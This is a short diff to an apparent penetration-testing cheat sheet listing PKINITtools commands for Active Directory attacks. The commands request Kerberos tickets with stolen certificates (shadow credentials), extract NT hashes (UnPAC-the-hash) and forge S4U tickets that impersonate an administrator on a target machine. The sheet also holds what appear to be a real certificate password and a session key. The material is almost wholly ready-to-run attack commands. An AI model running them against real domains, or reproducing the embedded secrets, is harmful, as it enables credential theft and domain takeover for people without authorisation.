@@ -1,7 +1,7 @@
 # PKINITtools — PKINIT exploitation (shadow creds, UnPAC-the-hash)
 python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass password $DOMAIN/$USER $USER.ccache
 python3 getnthash.py -key AS_REP_KEY $DOMAIN/$USER
-python3 gets4uticket.py kerberos+ccache://$DOMAIN\\$USER:$USER.ccache@$DC_IP cifs/$TARGET_IP@$DOMAIN $ADMIN_USER@$DOMAIN admin.ccache
+python3 gets4uticket.py kerberos+ccache://$DOMAIN\\$USER:$USER.ccache@$DC_IP cifs/$TARGET_COMPUTER@$DOMAIN $ADMIN_USER@$DOMAIN admin.ccache
 gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
 gettgtpkinit.py -pfx-base64 'CERT_BASE64' -dc-ip 'DC_IP' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
 KRB5CCNAME="$CCACHE_PATH" getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' "$DOMAIN"/'sv01$'
